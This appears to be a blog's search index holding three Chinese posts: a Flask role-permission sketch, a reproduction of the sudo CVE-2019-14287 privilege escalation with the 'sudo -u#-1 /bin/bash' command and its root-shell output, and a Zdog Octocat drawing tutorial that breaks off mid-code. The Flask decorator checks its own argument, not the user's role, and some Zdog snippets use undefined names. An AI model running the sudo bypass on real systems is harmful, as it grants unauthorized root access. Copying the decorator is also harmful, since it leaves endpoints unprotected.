<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Flask角色权限控制</title>
      <link href="/2019/11/18/flask-jiao-se-quan-xian-kong-zhi/"/>
      <url>/2019/11/18/flask-jiao-se-quan-xian-kong-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="Flask角色权限控制"><a href="#Flask角色权限控制" class="headerlink" title="Flask角色权限控制"></a>Flask角色权限控制</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前flask的组件并不能完美的解决角色权限控制问题。大部分组件都是check是否登录，每次请求检查session？</p><p>这并不是我想要的啊！我很喜欢前后端分离的理念，我不喜欢使用Python 模板语言，我觉得很臃肿。前端我还是很推荐使用vue，react等。后端很推荐REST架构设计，这样感觉思路清晰很多。</p><h2 id="为啥选择Flask"><a href="#为啥选择Flask" class="headerlink" title="为啥选择Flask"></a>为啥选择Flask</h2><p>我只能用简单易用来形容这个框架。Django = Flask + 插件</p><p>Django对于熟悉整个框架的人来说还是很方便的，因为他超多功能已经内置了，不需要像Flask装各种插件来满足自己的使用。但是Flask学习成本比较低不需要去学习一个庞大的系统。</p><h2 id="认证方式"><a href="#认证方式" class="headerlink" title="认证方式"></a>认证方式</h2><blockquote><p>认证方式：Basic Auth，Token，OAuth等</p></blockquote><p><strong>Basic Auth：</strong></p><p>​        通过用户名密码来验证，会不会太麻烦了，针对每个资源都要被要求认证（每次都要输入账号密码），我是脑子瓦特了？这时候有人会说我可以用session，cookie来维持会话啊，这样登录一次不就好了。这个已经涉及到另一种认证方式了。</p><p>​        客户端将输入的用户名密码用Base64进行编码后，采用非加密的明文方式传送给服务器。但是这种方式是比较可逆的。数据易抓取导致账号被盗取利用。**</p><p><strong>Token Auth：</strong></p><p>​        当你登录成功，服务端将会返回一个Token给你，当你每次请求时Header头携带Token进行资源请求验证，在这个过程已经不再涉及用户名密码，session，cookie了，做到无状态请求。且支持跨域访问等。</p><p>​        我个人还是很推荐使用Token认证的，而且我觉得也是简单方便。</p><p><strong>OAuth：</strong></p><p>​        这个认证一般第三方认证用的会比较多，你只需要用同一个账号密码，就能在各个网站进行访问，而免去了在每个网站都进行注册的繁琐过程。 </p><p>​        这个在公司内网采用的最为  ，只需要认证一次就可以请求公司内网的各种资源。</p><p>我谈及的并不深入，只是个人的看法和认知，想要更加深入各位大佬可以寻找文章进行学习。</p><h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><p><img src="https://image.kalifun.top/upload/1908/76c35ea76c5d0b6f.png" alt></p><p>这个是大概的一个描述，接下我将讲一下我是如何实现角色权限控制的。</p><h2 id="角色权限控制"><a href="#角色权限控制" class="headerlink" title="角色权限控制"></a>角色权限控制</h2><blockquote><p>这个并没有正对单个权限进行验证,这个也是不足地方。</p></blockquote><p>假设我们有普通户，管理员，超级管理员。我们对每个接口进行验证角色是否有请求权限。</p><h3 id="装饰器functools"><a href="#装饰器functools" class="headerlink" title="装饰器functools"></a>装饰器functools</h3><pre><code>from functools import wrapsdef Authen(rolename):    def check(func):    @wraps(func)        def checkrole(*args,**kwargs):            if &quot;admin&quot; in rolename:                func(*args,**kwargs)            else:                return False        return checkrole    return check</code></pre><pre><code>import Authen@Authen([&quot;admin&quot;])def index():    print(&quot;admin 存在&quot;)@Authen([&#39;user&#39;])def index():    print(&quot;admin 不存在&quot;)</code></pre><p>这个示例不知道是否能想到我的做法呢？</p><p>利用装饰器来充当我们的拦截器，当每次路由访问的时候进行角色判断。</p><pre><code>@admin_api.route(&#39;/deluser&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])@cross_origin()@Authentication([&quot;admin&quot;])def deleteuser():    username = request.json.get(&quot;username&quot;)    if request.method == &#39;POST&#39;:        user = User.query_filter_by(username = username).first()        if user.role_id == 3:            user.deluser()            return jsonify({&quot;message&quot;:&quot;删除成功&quot;})        else:            return jsonify({&quot;message&quot;:&quot;删除失败&quot;}),403</code></pre><p>拦截器我就不举例了，因为和上面示例差不多，到时候我再出一篇Token生成，ToKen验证，角色控制结合在一起的文章，也许这样更能理解。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-14287提权漏洞</title>
      <link href="/2019/10/16/cve-2019-14287/"/>
      <url>/2019/10/16/cve-2019-14287/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2019-14287提权漏洞"><a href="#CVE-2019-14287提权漏洞" class="headerlink" title="CVE-2019-14287提权漏洞"></a>CVE-2019-14287提权漏洞</h1><p><em>sudo</em>是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具。</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>这个漏洞比较鸡肋，并不是sudo版本低就可以让你能够提权，需要满足一定条件才能触发这个漏洞。</p><h2 id="场景复现"><a href="#场景复现" class="headerlink" title="场景复现"></a>场景复现</h2><p>Linux默认是没有将用户添加到sudoers列表中的，需要root手动将账户添加到sudoers列表中，才能让普通账户执行sudo命令。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>sudo &lt; 1.8.28</p><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><p>在服务多的情况下，管理员会将一些普通用户添加到sudoers列表中，这也是我们触发漏洞的关键。</p><pre><code># username  ALL=(ALL,!root) ALL</code></pre><ul><li>username表示添加的用户名</li><li>第一个ALL表示允许该用户在任意机器或者终端中使用sudo</li><li>括号里面的（ALL,!root）表示命令可以被除了root以外的任意用户身份去执行</li><li>最后一个ALL表示被允许执行的命令</li></ul><p>修改/etc/sudoers文件，kalifun用户不能以root用户执行/bin/bash命令。</p><pre><code>kalifun ALL=(ALL,!root) /bin/bash</code></pre><h3 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h3><p>1.切换kalifun用户</p><pre><code>#su kalifun#whoami#kalifun</code></pre><p>2.执行/bin/bash</p><pre><code>#sudo /bin/bashSorry, user kalifun is not allowed to execute &#39;/bin/bash&#39; as root on xxxxxxxx.</code></pre><p>你会发现你无法执行bash命令。现在我们进行提权操作。</p><p>3.提权</p><pre><code>#sudo -u#-1 /bin/bashbash-4.2# whoamiroot</code></pre><p>现在你就变成root权限了。</p><p><img src="https://image.kalifun.top/upload/1910/d32109e04df264b4.png" alt></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>用户可以通过命令行上的 –u#-1 绕过这个非 root限制。如果将 sudo配置为允许用户通过Runas 规范中的 ALL 关键字以任意用户身份运行命令，则可以通过指定用户 ID为-1 或4294967295 以 root 用户身份运行命令。只要Runas 规范中最先列出 ALL 关键字，即使Runas 规范明确禁止 root访问权限，那么具有足够的 sudo 权限的而用户即可以 root 身份运行命令。以这种方式运行的命令的日志条目会把目标用户列为 4294967295而非 root。</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>手动升级sudo版本。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/news/216821.html" target="_blank" rel="noopener">Linux Sudo被曝漏洞，可导致用户以root权限运行命令</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>教你用开源 JS 库快速画出 GitHub 章鱼猫</title>
      <link href="/2019/09/19/jiao-ni-yong-kai-yuan-js-ku-kuai-su-hua-chu-github-zhang-yu-mao/"/>
      <url>/2019/09/19/jiao-ni-yong-kai-yuan-js-ku-kuai-su-hua-chu-github-zhang-yu-mao/</url>
      
        <content type="html"><![CDATA[<h1 id="教你用开源-JS-库快速画出-GitHub-章鱼猫"><a href="#教你用开源-JS-库快速画出-GitHub-章鱼猫" class="headerlink" title="教你用开源 JS 库快速画出 GitHub 章鱼猫"></a>教你用开源 JS 库快速画出 GitHub 章鱼猫</h1><p><img src="images/1.png" alt></p><p align="center">本文作者：HelloGitHub-<strong>kalifun</strong></p><p align="center"><strong>本文首发 HelloGitHub 欢迎大家加入 HelloGitHub-Team 大家庭</strong></p><blockquote><p>Zdog 项目地址：<a href="https://github.com/metafizzy/zdog" target="_blank" rel="noopener">https://github.com/metafizzy/zdog</a></p></blockquote><p>在上一篇文章我们介绍了 Zdog 如何使用，接下来这篇文章我将带领各位利用 Zdog 画出一个 GitHub 章鱼猫（和官方的还是有些差别的）。</p><h2 id="一、分析"><a href="#一、分析" class="headerlink" title="一、分析"></a>一、分析</h2><p>通过上面的动画，我们可以对 GitHub 章鱼猫进行分析，给我们最直观的就是 7 部分。头部、脸、眼睛、鼻子、嘴巴、胡须、耳朵。</p><ul><li>头部：由一个规则的实体圆角矩形组成。</li><li>脸：有两个规则的实体圆角矩形组成。第一层是制作阴影，第二层是脸。</li><li>眼睛：由三个椭圆形组成的眼睛，然后利用复制生成另一只眼睛。</li><li>鼻子：由一个椭圆形组成。</li><li>嘴巴：由一个椭圆形变成一个半圆形则是嘴巴啦。</li><li>胡须：由两条曲线进行复制完成。</li><li>耳朵：由带圆形底座的方形圆柱组成。</li></ul><p>通过上面分析我们需要使用的 API：</p><ul><li>Zdog.Anchor：将多个形状或项目合并成一个项目来进行渲染等。</li><li>Zdog.Group：控制渲染顺序，继承 Anchor，形状将按照添加到组中的顺序呈现。</li><li>Zdog.RoundedRect：圆角矩形，使用 cornerRadius 设置圆角半径。</li><li>Zdog.Cone：带圆形底座的方形圆柱。</li><li>Zdog.Shape：自定义形状的形状类。Shape 的形状由其路径定义。</li><li>Zdog.TAU：以弧度为单位的完整旋转。Math.PI * 2 == TAU，但比 PI 更加友好，因为 TAU 直接映射到完整旋转。</li><li>copy：针对相同的形状进行复制。</li><li>copyGraph：复制带有子项的项目。</li></ul><h2 id="二、步骤"><a href="#二、步骤" class="headerlink" title="二、步骤"></a>二、步骤</h2><p><strong>Tips：</strong> 解释讲解均在代码中以注释方式展示，请大家注意阅读。</p><h3 id="2-1-创建画布"><a href="#2-1-创建画布" class="headerlink" title="2.1 创建画布"></a>2.1 创建画布</h3><p>是时候开始表演了，首先需要创建画布。代码如下：</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>GitHub 章鱼猫<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">        <span class="token selector"><span class="token class">.zdog-canvas</span></span><span class="token punctuation">{</span>            <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>            <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span>px auto<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--Zdog在&lt;canvas>或&lt;svg>元素上呈现。width和height属性以设置大小。--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zdog-canvas<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>800<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">600</span>px<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">400</span>px</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--引入js文件--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/zdog@1/dist/zdog.dist.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token comment" spellcheck="true">// 1.将选定画布，进行创作</span>    <span class="token keyword">let</span> illo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Illustration</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        element<span class="token punctuation">:</span> <span class="token string">".zdog-canvas"</span><span class="token punctuation">,</span>        dragRotate<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//下面是准备的配色</span>    <span class="token comment" spellcheck="true">// 瞳孔的颜色</span>    <span class="token keyword">const</span> colorFeatures <span class="token operator">=</span> <span class="token string">"#AB5C53"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 头的颜色</span>    <span class="token keyword">const</span> black         <span class="token operator">=</span> <span class="token string">"#211F1F"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 阴影的颜色</span>    <span class="token keyword">const</span> colorShadow   <span class="token operator">=</span> <span class="token string">"#C39B88"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 皮肤的颜色</span>    <span class="token keyword">const</span> colorSkin     <span class="token operator">=</span> <span class="token string">"#E5C0AA"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 眼睛最外圈的颜色</span>    <span class="token keyword">const</span> white         <span class="token operator">=</span> <span class="token string">"#FFF"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//----------------------------</span>    <span class="token comment" spellcheck="true">//下面的所有代码将都在这里书写</span>    <span class="token comment" spellcheck="true">//----------------------------</span>    illo<span class="token punctuation">.</span><span class="token function">updateRenderGraph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h3 id="2-2-画头"><a href="#2-2-画头" class="headerlink" title="2.2 画头"></a>2.2 画头</h3><p>按照我们之前分解的，先画 GitHub 章鱼猫的头。代码如下：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 可以添加到Zdog场景的所有项目都充当锚点。</span><span class="token keyword">const</span> head <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Anchor</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    addTo<span class="token punctuation">:</span> illo<span class="token punctuation">,</span>    translate<span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 向y轴移动</span>        y<span class="token punctuation">:</span> <span class="token number">15</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 具有分离渲染顺序的项目。继承Anchor。</span><span class="token keyword">const</span> domepiece <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Group</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    addTo<span class="token punctuation">:</span> head<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 真正进行画头，是一个实体矩形</span><span class="token keyword">const</span> noggin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>RoundedRect</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    addTo<span class="token punctuation">:</span> domepiece<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 设置高度和宽度</span>    width<span class="token punctuation">:</span> <span class="token number">160</span><span class="token punctuation">,</span>    height<span class="token punctuation">:</span> <span class="token number">66</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 渲染形状线并设置线宽。默认笔划：1。</span>    stroke<span class="token punctuation">:</span> <span class="token number">230</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 使用cornerRadius设置圆角半径</span>    cornerRadius<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 设置颜色</span>    color<span class="token punctuation">:</span> black<span class="token punctuation">,</span>    path<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span> x<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">4.5</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span> x<span class="token punctuation">:</span> <span class="token number">5.5</span> <span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>效果如下：</p><p><img src="images/2.png" alt></p><h3 id="2-3-画脸"><a href="#2-3-画脸" class="headerlink" title="2.3 画脸"></a>2.3 画脸</h3><p>面部的实现代码如下：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 我们需要画下一组图形，那就是脸。脸被定义为一组</span><span class="token keyword">const</span> face <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Group</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    addTo<span class="token punctuation">:</span> head<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 将阴影部分进行位置的调节</span>    translate<span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// x轴我们不动，保持正中</span>        x<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// y轴进行往下移动</span>        y<span class="token punctuation">:</span> <span class="token number">36</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 为了3D更加真实，我们需要将脸部往外突出一点。这样才更加逼真</span>        z<span class="token punctuation">:</span> <span class="token number">20</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 下面我们开始进行阴影的绘画，它是由一个实体矩形组成</span><span class="token keyword">const</span> skinShadow <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>RoundedRect</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    addTo<span class="token punctuation">:</span> face<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 设置高度和宽度</span>    width<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span>    height<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 渲染形状线并设置线宽。默认笔划：1。</span>    stroke<span class="token punctuation">:</span> <span class="token number">180</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">//使用cornerRadius设置圆角半径</span>    cornerRadius<span class="token punctuation">:</span> <span class="token number">40</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 设置颜色</span>    color<span class="token punctuation">:</span> colorShadow<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 下面开始画脸的部分</span><span class="token keyword">const</span> skin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>RoundedRect</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    addTo<span class="token punctuation">:</span> face<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 高宽和上面需要一直，为了产生阴影的效果，我们只需要将我们的画笔的宽度小一点并就可以看到想要的效果。</span>    width<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span>    height<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 比之前的阴影部分减小一点</span>    stroke<span class="token punctuation">:</span> <span class="token number">170</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 圆角半径和阴影部分是一致的</span>    cornerRadius<span class="token punctuation">:</span> <span class="token number">40</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 设置颜色</span>    color<span class="token punctuation">:</span> colorSkin<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 为了和阴影的下半部分重叠，需要将其往下移动</span>    translate<span class="token punctuation">:</span> <span class="token punctuation">{</span>        y<span class="token punctuation">:</span> <span class="token number">4.5</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>效果如下：</p><p><img src="images/3.png" alt></p><h3 id="2-4-画眼睛"><a href="#2-4-画眼睛" class="headerlink" title="2.4 画眼睛"></a>2.4 画眼睛</h3><p>眼睛部分因为是相同的，所以我们会用到 <code>copy</code> 方法，代码如下:</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 眼睛最外部分为纯白色</span><span class="token keyword">const</span> iris <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Ellipse</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    addTo<span class="token punctuation">:</span> eye<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 渲染内部形状区域</span>    fill<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    width<span class="token punctuation">:</span> <span class="token number">40</span><span class="token punctuation">,</span>    height<span class="token punctuation">:</span> <span class="token number">56</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 圆角半径</span>    stroke<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 放大或缩小项目几何体</span>    scale<span class="token punctuation">:</span> <span class="token number">1.5</span><span class="token punctuation">,</span>    color<span class="token punctuation">:</span> white<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 瞳孔部分</span><span class="token keyword">const</span> pupil <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Ellipse</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    addTo<span class="token punctuation">:</span> eye<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 设置长宽</span>    width<span class="token punctuation">:</span> <span class="token number">37</span><span class="token punctuation">,</span>    height<span class="token punctuation">:</span> <span class="token number">56</span><span class="token punctuation">,</span>    stroke<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    fill<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    color<span class="token punctuation">:</span> colorFeatures<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 由于它的位置需要更靠近右边</span>    translate<span class="token punctuation">:</span> <span class="token punctuation">{</span>        x<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span>        y<span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span>        z<span class="token punctuation">:</span> <span class="token number">0</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 然后是瞳孔里的小白点</span><span class="token keyword">const</span> anotherpupil <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Ellipse</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    addTo<span class="token punctuation">:</span> pupil<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 设置宽度</span>    width<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>    height<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>    color<span class="token punctuation">:</span> white<span class="token punctuation">,</span>    fill<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    stroke<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 设置位置</span>    translate<span class="token punctuation">:</span> <span class="token punctuation">{</span>        x<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">,</span>        y<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">12</span><span class="token punctuation">,</span>        z<span class="token punctuation">:</span> <span class="token number">3</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 这里将刚绘画好的左眼复制出来</span><span class="token keyword">const</span> eyeright <span class="token operator">=</span> eyeleft<span class="token punctuation">.</span><span class="token function">copyGraph</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 并调整好眼睛的位置</span>    translate<span class="token punctuation">:</span> <span class="token punctuation">{</span>        x<span class="token punctuation">:</span> <span class="token number">76</span><span class="token punctuation">,</span>        y<span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span>        z<span class="token punctuation">:</span> <span class="token number">80</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    rotate<span class="token punctuation">:</span> <span class="token punctuation">{</span>        y<span class="token punctuation">:</span> TAU <span class="token operator">/</span> <span class="token operator">-</span><span class="token number">14</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>效果如下：</p><p><img src="images/4.png" alt></p><h3 id="2-5-画鼻子"><a href="#2-5-画鼻子" class="headerlink" title="2.5 画鼻子"></a>2.5 画鼻子</h3><p>代码如下：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 画鼻子部分，相对很简单，因为就是一个圆形</span><span class="token keyword">const</span> nose <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Ellipse</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    addTo<span class="token punctuation">:</span> face<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 设置宽度</span>    width<span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span>    height<span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span>    fill<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    stroke<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 设置颜色</span>    color<span class="token punctuation">:</span> colorFeatures<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 调整位置</span>    translate<span class="token punctuation">:</span> <span class="token punctuation">{</span>        x<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        y<span class="token punctuation">:</span> <span class="token number">32</span><span class="token punctuation">,</span>        z<span class="token punctuation">:</span> <span class="token number">74</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>效果如下：</p><p><img src="images/5.png" alt></p><h3 id="2-6-画嘴巴"><a href="#2-6-画嘴巴" class="headerlink" title="2.6 画嘴巴"></a>2.6 画嘴巴</h3><p>代码如下：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//接下来是画嘴巴部分</span><span class="token keyword">const</span> mouth <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zdog<span class="token punctuation">.</span>Ellipse</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    addTo<span class="token punctuation">:</span> face<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 设置圆的直径</span>    diameter<span class="token punctuation">:</span> <span class="token number">30</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 将其设置为1/4的圆，我们取值为2，所以获得半圆</span>    quarters<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 设置圆角半径</span>    stroke<span class="token punctuation">:</span> <span class="token 